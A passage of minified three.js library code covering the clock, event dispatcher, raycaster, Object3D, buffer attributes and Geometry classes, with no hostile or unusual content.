e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;b=(c-b)/(d-b);for(c=a+g;a!==c;a+=4)THREE.Quaternion.slerpFlat(e,0,f,a-g,f,a,b);return e}});THREE.Clock=function(a){this.autoStart=void 0!==a?a:!0;this.elapsedTime=this.oldTime=this.startTime=0;this.running=!1};\nTHREE.Clock.prototype={constructor:THREE.Clock,start:function(){this.oldTime=this.startTime=(performance||Date).now();this.running=!0},stop:function(){this.getElapsedTime();this.running=!1},getElapsedTime:function(){this.getDelta();return this.elapsedTime},getDelta:function(){var a=0;this.autoStart&&!this.running&&this.start();if(this.running){var b=(performance||Date).now(),a=(b-this.oldTime)/1E3;this.oldTime=b;this.elapsedTime+=a}return a}};THREE.EventDispatcher=function(){};\nObject.assign(THREE.EventDispatcher.prototype,{addEventListener:function(a,b){void 0===this._listeners&&(this._listeners={});var c=this._listeners;void 0===c[a]&&(c[a]=[]);-1===c[a].indexOf(b)&&c[a].push(b)},hasEventListener:function(a,b){if(void 0===this._listeners)return!1;var c=this._listeners;return void 0!==c[a]&&-1!==c[a].indexOf(b)?!0:!1},removeEventListener:function(a,b){if(void 0!==this._listeners){var c=this._listeners[a];if(void 0!==c){var d=c.indexOf(b);-1!==d&&c.splice(d,1)}}},dispatchEvent:function(a){if(void 0!==\nthis._listeners){var b=this._listeners[a.type];if(void 0!==b){a.target=this;for(var c=[],d=0,e=b.length,d=0;d<e;d++)c[d]=b[d];for(d=0;d<e;d++)c[d].call(this,a)}}}});THREE.Layers=function(){this.mask=1};THREE.Layers.prototype={constructor:THREE.Layers,set:function(a){this.mask=1<<a},enable:function(a){this.mask|=1<<a},toggle:function(a){this.mask^=1<<a},disable:function(a){this.mask&=~(1<<a)},test:function(a){return 0!==(this.mask&a.mask)}};\n(function(a){function b(a,b){return a.distance-b.distance}function c(a,b,f,g){if(!1!==a.visible&&(a.raycast(b,f),!0===g)){a=a.children;g=0;for(var h=a.length;g<h;g++)c(a[g],b,f,!0)}}a.Raycaster=function(b,c,f,g){this.ray=new a.Ray(b,c);this.near=f||0;this.far=g||Infinity;this.params={Mesh:{},Line:{},LOD:{},Points:{threshold:1},Sprite:{}};Object.defineProperties(this.params,{PointCloud:{get:function(){console.warn(\"THREE.Raycaster: params.PointCloud has been renamed to params.Points.\");return this.Points}}})};\na.Raycaster.prototype={constructor:a.Raycaster,linePrecision:1,set:function(a,b){this.ray.set(a,b)},setFromCamera:function(b,c){c instanceof a.PerspectiveCamera?(this.ray.origin.setFromMatrixPosition(c.matrixWorld),this.ray.direction.set(b.x,b.y,.5).unproject(c).sub(this.ray.origin).normalize()):c instanceof a.OrthographicCamera?(this.ray.origin.set(b.x,b.y,(c.near+c.far)/(c.near-c.far)).unproject(c),this.ray.direction.set(0,0,-1).transformDirection(c.matrixWorld)):console.error(\"THREE.Raycaster: Unsupported camera type.\")},\nintersectObject:function(a,e){var f=[];c(a,this,f,e);f.sort(b);return f},intersectObjects:function(a,e){var f=[];if(!1===Array.isArray(a))return console.warn(\"THREE.Raycaster.intersectObjects: objects is not an Array.\"),f;for(var g=0,h=a.length;g<h;g++)c(a[g],this,f,e);f.sort(b);return f}}})(THREE);\nTHREE.Object3D=function(){Object.defineProperty(this,\"id\",{value:THREE.Object3DIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"Object3D\";this.parent=null;this.children=[];this.up=THREE.Object3D.DefaultUp.clone();var a=new THREE.Vector3,b=new THREE.Euler,c=new THREE.Quaternion,d=new THREE.Vector3(1,1,1);b.onChange(function(){c.setFromEuler(b,!1)});c.onChange(function(){b.setFromQuaternion(c,void 0,!1)});Object.defineProperties(this,{position:{enumerable:!0,value:a},rotation:{enumerable:!0,\nvalue:b},quaternion:{enumerable:!0,value:c},scale:{enumerable:!0,value:d},modelViewMatrix:{value:new THREE.Matrix4},normalMatrix:{value:new THREE.Matrix3}});this.matrix=new THREE.Matrix4;this.matrixWorld=new THREE.Matrix4;this.matrixAutoUpdate=THREE.Object3D.DefaultMatrixAutoUpdate;this.matrixWorldNeedsUpdate=!1;this.layers=new THREE.Layers;this.visible=!0;this.receiveShadow=this.castShadow=!1;this.frustumCulled=!0;this.renderOrder=0;this.userData={}};\nTHREE.Object3D.DefaultUp=new THREE.Vector3(0,1,0);THREE.Object3D.DefaultMatrixAutoUpdate=!0;\nObject.assign(THREE.Object3D.prototype,THREE.EventDispatcher.prototype,{applyMatrix:function(a){this.matrix.multiplyMatrices(a,this.matrix);this.matrix.decompose(this.position,this.quaternion,this.scale)},setRotationFromAxisAngle:function(a,b){this.quaternion.setFromAxisAngle(a,b)},setRotationFromEuler:function(a){this.quaternion.setFromEuler(a,!0)},setRotationFromMatrix:function(a){this.quaternion.setFromRotationMatrix(a)},setRotationFromQuaternion:function(a){this.quaternion.copy(a)},rotateOnAxis:function(){var a=\nnew THREE.Quaternion;return function(b,c){a.setFromAxisAngle(b,c);this.quaternion.multiply(a);return this}}(),rotateX:function(){var a=new THREE.Vector3(1,0,0);return function(b){return this.rotateOnAxis(a,b)}}(),rotateY:function(){var a=new THREE.Vector3(0,1,0);return function(b){return this.rotateOnAxis(a,b)}}(),rotateZ:function(){var a=new THREE.Vector3(0,0,1);return function(b){return this.rotateOnAxis(a,b)}}(),translateOnAxis:function(){var a=new THREE.Vector3;return function(b,c){a.copy(b).applyQuaternion(this.quaternion);\nthis.position.add(a.multiplyScalar(c));return this}}(),translateX:function(){var a=new THREE.Vector3(1,0,0);return function(b){return this.translateOnAxis(a,b)}}(),translateY:function(){var a=new THREE.Vector3(0,1,0);return function(b){return this.translateOnAxis(a,b)}}(),translateZ:function(){var a=new THREE.Vector3(0,0,1);return function(b){return this.translateOnAxis(a,b)}}(),localToWorld:function(a){return a.applyMatrix4(this.matrixWorld)},worldToLocal:function(){var a=new THREE.Matrix4;return function(b){return b.applyMatrix4(a.getInverse(this.matrixWorld))}}(),\nlookAt:function(){var a=new THREE.Matrix4;return function(b){a.lookAt(b,this.position,this.up);this.quaternion.setFromRotationMatrix(a)}}(),add:function(a){if(1<arguments.length){for(var b=0;b<arguments.length;b++)this.add(arguments[b]);return this}if(a===this)return console.error(\"THREE.Object3D.add: object can't be added as a child of itself.\",a),this;a instanceof THREE.Object3D?(null!==a.parent&&a.parent.remove(a),a.parent=this,a.dispatchEvent({type:\"added\"}),this.children.push(a)):console.error(\"THREE.Object3D.add: object not an instance of THREE.Object3D.\",\na);return this},remove:function(a){if(1<arguments.length)for(var b=0;b<arguments.length;b++)this.remove(arguments[b]);b=this.children.indexOf(a);-1!==b&&(a.parent=null,a.dispatchEvent({type:\"removed\"}),this.children.splice(b,1))},getObjectById:function(a){return this.getObjectByProperty(\"id\",a)},getObjectByName:function(a){return this.getObjectByProperty(\"name\",a)},getObjectByProperty:function(a,b){if(this[a]===b)return this;for(var c=0,d=this.children.length;c<d;c++){var e=this.children[c].getObjectByProperty(a,\nb);if(void 0!==e)return e}},getWorldPosition:function(a){a=a||new THREE.Vector3;this.updateMatrixWorld(!0);return a.setFromMatrixPosition(this.matrixWorld)},getWorldQuaternion:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c){c=c||new THREE.Quaternion;this.updateMatrixWorld(!0);this.matrixWorld.decompose(a,c,b);return c}}(),getWorldRotation:function(){var a=new THREE.Quaternion;return function(b){b=b||new THREE.Euler;this.getWorldQuaternion(a);return b.setFromQuaternion(a,\nthis.rotation.order,!1)}}(),getWorldScale:function(){var a=new THREE.Vector3,b=new THREE.Quaternion;return function(c){c=c||new THREE.Vector3;this.updateMatrixWorld(!0);this.matrixWorld.decompose(a,b,c);return c}}(),getWorldDirection:function(){var a=new THREE.Quaternion;return function(b){b=b||new THREE.Vector3;this.getWorldQuaternion(a);return b.set(0,0,1).applyQuaternion(a)}}(),raycast:function(){},traverse:function(a){a(this);for(var b=this.children,c=0,d=b.length;c<d;c++)b[c].traverse(a)},traverseVisible:function(a){if(!1!==\nthis.visible){a(this);for(var b=this.children,c=0,d=b.length;c<d;c++)b[c].traverseVisible(a)}},traverseAncestors:function(a){var b=this.parent;null!==b&&(a(b),b.traverseAncestors(a))},updateMatrix:function(){this.matrix.compose(this.position,this.quaternion,this.scale);this.matrixWorldNeedsUpdate=!0},updateMatrixWorld:function(a){!0===this.matrixAutoUpdate&&this.updateMatrix();if(!0===this.matrixWorldNeedsUpdate||!0===a)null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,\nthis.matrix),this.matrixWorldNeedsUpdate=!1,a=!0;for(var b=0,c=this.children.length;b<c;b++)this.children[b].updateMatrixWorld(a)},toJSON:function(a){function b(a){var b=[],c;for(c in a){var d=a[c];delete d.metadata;b.push(d)}return b}var c=void 0===a||\"\"===a,d={};c&&(a={geometries:{},materials:{},textures:{},images:{}},d.metadata={version:4.4,type:\"Object\",generator:\"Object3D.toJSON\"});var e={};e.uuid=this.uuid;e.type=this.type;\"\"!==this.name&&(e.name=this.name);\"{}\"!==JSON.stringify(this.userData)&&\n(e.userData=this.userData);!0===this.castShadow&&(e.castShadow=!0);!0===this.receiveShadow&&(e.receiveShadow=!0);!1===this.visible&&(e.visible=!1);e.matrix=this.matrix.toArray();void 0!==this.geometry&&(void 0===a.geometries[this.geometry.uuid]&&(a.geometries[this.geometry.uuid]=this.geometry.toJSON(a)),e.geometry=this.geometry.uuid);void 0!==this.material&&(void 0===a.materials[this.material.uuid]&&(a.materials[this.material.uuid]=this.material.toJSON(a)),e.material=this.material.uuid);if(0<this.children.length){e.children=\n[];for(var f=0;f<this.children.length;f++)e.children.push(this.children[f].toJSON(a).object)}if(c){var c=b(a.geometries),f=b(a.materials),g=b(a.textures);a=b(a.images);0<c.length&&(d.geometries=c);0<f.length&&(d.materials=f);0<g.length&&(d.textures=g);0<a.length&&(d.images=a)}d.object=e;return d},clone:function(a){return(new this.constructor).copy(this,a)},copy:function(a,b){void 0===b&&(b=!0);this.name=a.name;this.up.copy(a.up);this.position.copy(a.position);this.quaternion.copy(a.quaternion);this.scale.copy(a.scale);\nthis.matrix.copy(a.matrix);this.matrixWorld.copy(a.matrixWorld);this.matrixAutoUpdate=a.matrixAutoUpdate;this.matrixWorldNeedsUpdate=a.matrixWorldNeedsUpdate;this.visible=a.visible;this.castShadow=a.castShadow;this.receiveShadow=a.receiveShadow;this.frustumCulled=a.frustumCulled;this.renderOrder=a.renderOrder;this.userData=JSON.parse(JSON.stringify(a.userData));if(!0===b)for(var c=0;c<a.children.length;c++)this.add(a.children[c].clone());return this}});THREE.Object3DIdCount=0;\nTHREE.Face3=function(a,b,c,d,e,f){this.a=a;this.b=b;this.c=c;this.normal=d instanceof THREE.Vector3?d:new THREE.Vector3;this.vertexNormals=Array.isArray(d)?d:[];this.color=e instanceof THREE.Color?e:new THREE.Color;this.vertexColors=Array.isArray(e)?e:[];this.materialIndex=void 0!==f?f:0};\nTHREE.Face3.prototype={constructor:THREE.Face3,clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.a=a.a;this.b=a.b;this.c=a.c;this.normal.copy(a.normal);this.color.copy(a.color);this.materialIndex=a.materialIndex;for(var b=0,c=a.vertexNormals.length;b<c;b++)this.vertexNormals[b]=a.vertexNormals[b].clone();b=0;for(c=a.vertexColors.length;b<c;b++)this.vertexColors[b]=a.vertexColors[b].clone();return this}};\nTHREE.BufferAttribute=function(a,b,c){this.uuid=THREE.Math.generateUUID();this.array=a;this.itemSize=b;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.version=0;this.normalized=!0===c};\nTHREE.BufferAttribute.prototype={constructor:THREE.BufferAttribute,get count(){return this.array.length/this.itemSize},set needsUpdate(a){!0===a&&this.version++},setDynamic:function(a){this.dynamic=a;return this},copy:function(a){this.array=new a.array.constructor(a.array);this.itemSize=a.itemSize;this.dynamic=a.dynamic;return this},copyAt:function(a,b,c){a*=this.itemSize;c*=b.itemSize;for(var d=0,e=this.itemSize;d<e;d++)this.array[a+d]=b.array[c+d];return this},copyArray:function(a){this.array.set(a);\nreturn this},copyColorsArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyColorsArray(): color is undefined\",d),f=new THREE.Color);b[c++]=f.r;b[c++]=f.g;b[c++]=f.b}return this},copyIndicesArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];b[c++]=f.a;b[c++]=f.b;b[c++]=f.c}return this},copyVector2sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector2sArray(): vector is undefined\",\nd),f=new THREE.Vector2);b[c++]=f.x;b[c++]=f.y}return this},copyVector3sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector3sArray(): vector is undefined\",d),f=new THREE.Vector3);b[c++]=f.x;b[c++]=f.y;b[c++]=f.z}return this},copyVector4sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector4sArray(): vector is undefined\",d),f=new THREE.Vector4);\nb[c++]=f.x;b[c++]=f.y;b[c++]=f.z;b[c++]=f.w}return this},set:function(a,b){void 0===b&&(b=0);this.array.set(a,b);return this},getX:function(a){return this.array[a*this.itemSize]},setX:function(a,b){this.array[a*this.itemSize]=b;return this},getY:function(a){return this.array[a*this.itemSize+1]},setY:function(a,b){this.array[a*this.itemSize+1]=b;return this},getZ:function(a){return this.array[a*this.itemSize+2]},setZ:function(a,b){this.array[a*this.itemSize+2]=b;return this},getW:function(a){return this.array[a*\nthis.itemSize+3]},setW:function(a,b){this.array[a*this.itemSize+3]=b;return this},setXY:function(a,b,c){a*=this.itemSize;this.array[a+0]=b;this.array[a+1]=c;return this},setXYZ:function(a,b,c,d){a*=this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;return this},setXYZW:function(a,b,c,d,e){a*=this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;this.array[a+3]=e;return this},clone:function(){return(new this.constructor).copy(this)}};\nTHREE.Int8Attribute=function(a,b){return new THREE.BufferAttribute(new Int8Array(a),b)};THREE.Uint8Attribute=function(a,b){return new THREE.BufferAttribute(new Uint8Array(a),b)};THREE.Uint8ClampedAttribute=function(a,b){return new THREE.BufferAttribute(new Uint8ClampedArray(a),b)};THREE.Int16Attribute=function(a,b){return new THREE.BufferAttribute(new Int16Array(a),b)};THREE.Uint16Attribute=function(a,b){return new THREE.BufferAttribute(new Uint16Array(a),b)};\nTHREE.Int32Attribute=function(a,b){return new THREE.BufferAttribute(new Int32Array(a),b)};THREE.Uint32Attribute=function(a,b){return new THREE.BufferAttribute(new Uint32Array(a),b)};THREE.Float32Attribute=function(a,b){return new THREE.BufferAttribute(new Float32Array(a),b)};THREE.Float64Attribute=function(a,b){return new THREE.BufferAttribute(new Float64Array(a),b)};\nTHREE.DynamicBufferAttribute=function(a,b){console.warn(\"THREE.DynamicBufferAttribute has been removed. Use new THREE.BufferAttribute().setDynamic( true ) instead.\");return(new THREE.BufferAttribute(a,b)).setDynamic(!0)};THREE.InstancedBufferAttribute=function(a,b,c){THREE.BufferAttribute.call(this,a,b);this.meshPerAttribute=c||1};THREE.InstancedBufferAttribute.prototype=Object.create(THREE.BufferAttribute.prototype);THREE.InstancedBufferAttribute.prototype.constructor=THREE.InstancedBufferAttribute;\nTHREE.InstancedBufferAttribute.prototype.copy=function(a){THREE.BufferAttribute.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return this};THREE.InterleavedBuffer=function(a,b){this.uuid=THREE.Math.generateUUID();this.array=a;this.stride=b;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.version=0};\nTHREE.InterleavedBuffer.prototype={constructor:THREE.InterleavedBuffer,get length(){return this.array.length},get count(){return this.array.length/this.stride},set needsUpdate(a){!0===a&&this.version++},setDynamic:function(a){this.dynamic=a;return this},copy:function(a){this.array=new a.array.constructor(a.array);this.stride=a.stride;this.dynamic=a.dynamic;return this},copyAt:function(a,b,c){a*=this.stride;c*=b.stride;for(var d=0,e=this.stride;d<e;d++)this.array[a+d]=b.array[c+d];return this},set:function(a,\nb){void 0===b&&(b=0);this.array.set(a,b);return this},clone:function(){return(new this.constructor).copy(this)}};THREE.InstancedInterleavedBuffer=function(a,b,c){THREE.InterleavedBuffer.call(this,a,b);this.meshPerAttribute=c||1};THREE.InstancedInterleavedBuffer.prototype=Object.create(THREE.InterleavedBuffer.prototype);THREE.InstancedInterleavedBuffer.prototype.constructor=THREE.InstancedInterleavedBuffer;\nTHREE.InstancedInterleavedBuffer.prototype.copy=function(a){THREE.InterleavedBuffer.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return this};THREE.InterleavedBufferAttribute=function(a,b,c){this.uuid=THREE.Math.generateUUID();this.data=a;this.itemSize=b;this.offset=c};\nTHREE.InterleavedBufferAttribute.prototype={constructor:THREE.InterleavedBufferAttribute,get length(){console.warn(\"THREE.BufferAttribute: .length has been deprecated. Please use .count.\");return this.array.length},get count(){return this.data.count},setX:function(a,b){this.data.array[a*this.data.stride+this.offset]=b;return this},setY:function(a,b){this.data.array[a*this.data.stride+this.offset+1]=b;return this},setZ:function(a,b){this.data.array[a*this.data.stride+this.offset+2]=b;return this},\nsetW:function(a,b){this.data.array[a*this.data.stride+this.offset+3]=b;return this},getX:function(a){return this.data.array[a*this.data.stride+this.offset]},getY:function(a){return this.data.array[a*this.data.stride+this.offset+1]},getZ:function(a){return this.data.array[a*this.data.stride+this.offset+2]},getW:function(a){return this.data.array[a*this.data.stride+this.offset+3]},setXY:function(a,b,c){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;return this},setXYZ:function(a,\nb,c,d){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;return this},setXYZW:function(a,b,c,d,e){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;this.data.array[a+3]=e;return this}};\nTHREE.Geometry=function(){Object.defineProperty(this,\"id\",{value:THREE.GeometryIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"Geometry\";this.vertices=[];this.colors=[];this.faces=[];this.faceVertexUvs=[[]];this.morphTargets=[];this.morphNormals=[];this.skinWeights=[];this.skinIndices=[];this.lineDistances=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.lineDistancesNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.uvsNeedUpdate=this.elementsNeedUpdate=\nthis.verticesNeedUpdate=!1};\nObject.assign(THREE.Geometry.prototype,THREE.EventDispatcher.prototype,{applyMatrix:function(a){for(var b=(new THREE.Matrix3).getNormalMatrix(a),c=0,d=this.vertices.length;c<d;c++)this.vertices[c].applyMatrix4(a);c=0;for(d=this.faces.length;c<d;c++){a=this.faces[c];a.normal.applyMatrix3(b).normalize();for(var e=0,f=a.vertexNormals.length;e<f;e++)a.vertexNormals[e].applyMatrix3(b).normalize()}null!==this.boundingBox&&this.computeBoundingBox();null!==this.boundingSphere&&this.computeBoundingSphere();\nthis.normalsNeedUpdate=this.verticesNeedUpdate=!0;return this},rotateX:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationX(b);this.applyMatrix(a);return this}}(),rotateY:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationY(b);this.applyMatrix(a);return this}}(),rotateZ:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationZ(b);this.applyMatrix(a);return this}}(),translate:function(){var a;return function(b,\nc,d){void 0===a&&(a=new THREE.Matrix4);a.makeTranslation(b,c,d);this.applyMatrix(a);return this}}(),scale:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Matrix4);a.makeScale(b,c,d);this.applyMatrix(a);return this}}(),lookAt:function(){var a;return function(b){void 0===a&&(a=new THREE.Object3D);a.lookAt(b);a.updateMatrix();this.applyMatrix(a.matrix)}}(),fromBufferGeometry:function(a){function b(a,b,d,e){var f=void 0!==g?[n[a].clone(),n[b].clone(),n[d].clone()]:[],q=void 0!==h?[c.colors[a].clone(),\nc.colors[b].clone(),c.colors[d].clone()]:[];e=new THREE.Face3(a,b,d,f,q,e);c.faces.push(e);void 0!==k&&c.faceVertexUvs[0].push([p[a].clone(),p[b].clone(),p[d].clone()]);void 0!==l&&c.faceVertexUvs[1].push([m[a].clone(),m[b].clone(),m[d].clone()])}var c=this,d=null!==a.index?a.index.array:void 0,e=a.attributes,f=e.position.array,g=void 0!==e.normal?e.normal.array:void 0,h=void 0!==e.color?e.color.array:void 0,k=void 0!==e.uv?e.uv.array:void 0,l=void 0!==e.uv2?e.uv2.array:void 0;void 0!==l&&(this.faceVertexUvs[1]=\n[]);for(var n=[],p=[],m=[],q=e=0;e<f.length;e+=3,q+=2)c.vertices.push(new THREE.Vector3(f[e],f[e+1],f[e+2])),void 0!==g&&n.push(new THREE.Vector3(g[e],g[e+1],g[e+2])),void 0!==h&&c.colors.push(new THREE.Color(h[e],h[e+1],h[e+2])),void 0!==k&&p.push(new THREE.Vector2(k[q],k[q+1])),void 0!==l&&m.push(new THREE.Vector2(l[q],l[q+1]));if(void 0!==d)if(f=a.groups,0<f.length)for(e=0;e<f.length;e++)for(var r=f[e],s=r.start,t=r.count,q=s,s=s+t;q<s;q+=3)b(d[q],d[q+1],d[q+2],r.materialIndex);else for(e=0;e<\nd.length;e+=3)b(d[e],d[e+1],d[e+2]);else for(e=0;e<f.length/3;e+=3)b(e,e+1,e+2);this.computeFaceNormals();null!==a.boundingBox&&(this.boundingBox=a.boundingBox.clone());null!==a.boundingSphere&&(this.boundingSphere=a.boundingSphere.clone());return this},center:function(){this.computeBoundingBox();var a=this.boundingBox.center().negate();this.translate(a.x,a.y,a.z);return a},normalize:function(){this.computeBoundingSphere();var a=this.boundingSphere.center,b=this.boundingSphere.radius,b=0===b?1:1/\nb,c=new THREE.Matrix4;c.set(b,0,0,-b*a.x,0,b,0,-b*a.y,0,0,b,-b*a.z,0,0,0,1);this.applyMatrix(c);return this},computeFaceNormals:function(){for(var a=new THREE.Vector3,b=new THREE.Vector3,c=0,d=this.faces.length;c<d;c++){var e=this.faces[c],f=this.vertices[e.a],g=this.vertices[e.b];a.subVectors(this.vertices[e.c],g);b.subVectors(f,g);a.cross(b);a.normalize();e.normal.copy(a)}},computeVertexNormals:function(a){void 0===a&&(a=!0);var b,c,d;d=Array(this.vertices.length);b=0;for(c=this.vertices.length;b<\nc;b++)d[b]=new THREE.Vector3;if(a){var e,f,g,h=new THREE.Vector3,k=new THREE.Vector3;a=0;for(b=this.faces.length;a<b;a++)c=this.faces[a],e=this.vertices[c.a],f=this.vertices[c.b],g=this.vertices[c.c],h.subVectors(g,f),k.subVectors(e,f),h.cross(k),d[c.a].add(h),d[c.b].add(h),d[c.c].add(h)}else for(a=0,b=this.faces.length;a<b;a++)c=this.faces[a],d[c.a].add(c.normal),d[c.b].add(c.normal),d[c.c].add(c.normal);b=0;for(c=this.vertices.length;b<c;b++)d[b].normalize();a=0;for(b=this.faces.length;a<b;a++)c=\nthis.faces[a],e=c.vertexNormals,3===e.length?(e[0].copy(d[c.a]),e[1].copy(d[c.b]),e[2].copy(d[c.c])):(e[0]=d[c.a].clone(),e[1]=d[c.b].clone(),e[2]=d[c.c].clone());0<this.faces.length&&(this.normalsNeedUpdate=!0)},computeMorphNormals:function(){var a,b,c,d,e;c=0;for(d=this.faces.length;c<d;c++)for(e=this.faces[c],e.__originalFaceNormal?e.__originalFaceNormal.copy(e.normal):e.__originalFaceNormal=e.normal.clone(),e.__originalVertexNormals||(e.__originalVertexNormals=[]),a=0,b=e.vertexNormals.length;a<\nb;a++)e.__originalVertexNormals[a]?e.__originalVertexNormals[a].copy(e.vertexNormals[a]):e.__originalVertexNormals[a]=e.vertexNormals[a].clone();var f=new THREE.Geometry;f.faces=this.faces;a=0;for(b=this.morphTargets.length;a<b;a++){if(!this.morphNormals[a]){this.morphNormals[a]={};this.morphNormals[a].faceNormals=[];this.morphNormals[a].vertexNormals=[];e=this.morphNormals[a].faceNormals;var g=this.morphNormals[a].vertexNormals,h,k;c=0;for(d=this.faces.length;c<d;c++)h=new THREE.Vector3,k={a:new THREE.Vector3,\nb:new THREE.Vector3,c:new THREE.Vector3},e.push(h),g.push(k)}g=this.morphNormals[a];f.vertices=this.morphTargets[a].vertices;f.computeFaceNormals();f.computeVertexNormals();c=0;for(d=this.faces.length;c<d;c++)e=this.faces[c],h=g.faceNormals[c],k=g.vertexNormals[c],h.copy(e.normal),k.a.copy(e.vertexNormals[0]),k.b.copy(e.vertexNormals[1]),k.c.copy(e.vertexNormals[2])}c=0;for(d=this.faces.length;c<d;c++)e=this.faces[c],e.normal=e.__originalFaceNormal,e.vertexNormals=e.__originalVertexNormals},computeTangents:function(){console.warn(\"THREE.Geometry: .computeTangents() has been removed.\")},\ncomputeLineDistances:function(){for(var a=0,b=this.vertices,c=0,d=b.length;c<d;c++)0<c&&(a+=b[c].distanceTo(b[c-1])),this.lineDistances[c]=a},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new THREE.Box3);this.boundingBox.setFromPoints(this.vertices)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new THREE.Sphere);this.boundingSphere.setFromPoints(this.vertices)},merge:function(a,b,c){if(!1===a instanceof THREE.Geometry)console.error(\"THREE.Geometry.merge(): geometry not an instance of THREE.Geometry.\",\na);else{var d,e=this.vertices.length,f=this.vertices,g=a.vertices,h=this.faces,k=a.faces,l=this.faceVertexUvs[0];a=a.faceVertexUvs[0];void 0===c&&(c=0);void 0!==b&&(d=(new THREE.Matrix3).getNormalMatrix(b));for(var n=0,p=g.length;n<p;n++){var m=g[n].clone();void 0!==b&&m.applyMatrix4(b);f.push(m)}n=0;for(p=k.length;n<p;n++){var g=k[n],q,r=g.vertexNormals,s=g.vertexColors,m=new THREE.Face3(g.a+e,g.b+e,g.c+e);m.normal.copy(g.normal);void 0!==d&&m.normal.applyMatrix3(d).normalize();b=0;for(f=r.length;b<\nf;b++)q=r[b].clone(),void 0!==d&&q.applyMatrix3(d).normalize(),m.vertexNormals.push(q);m.color.copy(g.color);b=0;for(f=s.length;b<f;b++)q=s[b],m.vertexColors.push(q.clone());m.materialIndex=g.materialIndex+c;h.push(m)}n=0;for(p=a.length;n<p;n++)if(c=a[n],d=[],void 0!==c){b=0;for(f=c.length;b<f;b++)d.push(c[b].clone());l.push(d)}}},mergeMesh:function(a){!1===a instanceof THREE.Mesh?console.error(\"THREE.Geometry.mergeMesh(): mesh not an instance of THREE.Mesh.\",a):(a.matrixAutoUpdate&&a.updateMatrix(),\nthis.merge(a.geometry,a.matrix))},mergeVertices:function(){var a={},b=[],c=[],d,e=Math.pow(10,4),f,g;f=0;for(g=this.vertices.length;f<g;f++)d=this.vertices[f],d=Math.round(d.x*e)+\"_\"+Math.round(d.y*e)+\"_\"+Math.round(d.z*e),void 0===a[d]?(a[d]=f,b.push(this.vertices[f]),c[f]=b.length-1):c[f]=c[a[d]];a=[];f=0;for(g=this.faces.length;f<g;f++)for(e=this.faces[f],e.a=c[e.a],e.b=c[e.b],e.c=c[e.c],e=[e.a,e.b,e.c],d=0;3>d;d++)if(e[d]===e[(d+1)%3]){a.push(f);break}for(f=a.length-1;0<=f;f--)for(e=a[f],this.faces.splice(e,\n1),c=0,g=this.faceVertexUvs.length;c<g;c++)this.faceVertexUvs[c].splice(e,1);f=this.vertices.length-b.length;this.vertices=b;return f},sortFacesByMaterialIndex:function(){for(var a=this.faces,b=a.length,c=0;c<b;c++)a[c]._id=c;a.sort(function(a,b){return a.materialIndex-b.materialIndex});var d=this.faceVertexUvs[0],e=this.faceVertexUvs[1],f,g;d&&d.length===b&&(f=[]);e&&e.length===b&&(g=[]);for(c=0;c<b;c++){var h=a[c]._id;f&&f.push(d[h]);g&&g.push(e[h])}f&&(this.faceVertexUvs[0]=f);g&&(this.faceVertexUvs[1]=\ng)},toJSON:function(){function a(a,b,c){return c?a|1<<b:a&~(1<<b)}function b(a){var b=a.x.toString()+a.y.toString()+a.z.toString();if(void 0!==l[b])return l[b];l[b]=k.length/3;k.push(a.x,a.y,a.z);return l[b]}function c(a){var b=a.r.toString()+a.g.toString()+a.b.toString();if(void 0!==p[b])return p[b];p[b]=n.length;n.push(a.getHex());return p[b]}function d(a){var b=a.x.toString()+a.y.toString();if(void 0!==q[b])return q[b];q[b]=m.length/2;m.push(a.x,a.y);return q[b]}var e={metadata:{version:4.4,type:\"Geometry\",\ngenerator:\"Geometry.toJSON\"}};e.uuid=this.uuid;e.type=this.type;\"\"!==this.name&&(e.name=this.name);if(void 0!==this.parameters){var f=this.parameters,g;for(g in f)void 0!==f[g]&&(e[g]=f[g]);return e}f=[];for(g=0;g<this.vertices.length;g++){var h=this.vertices[g];f.push(h.x,h.y,h.z)}var h=[],k=[],l={},n=[],p={},m=[],q={};for(g=0;g<this.faces.length;g++){var r=this.faces[g],s=void 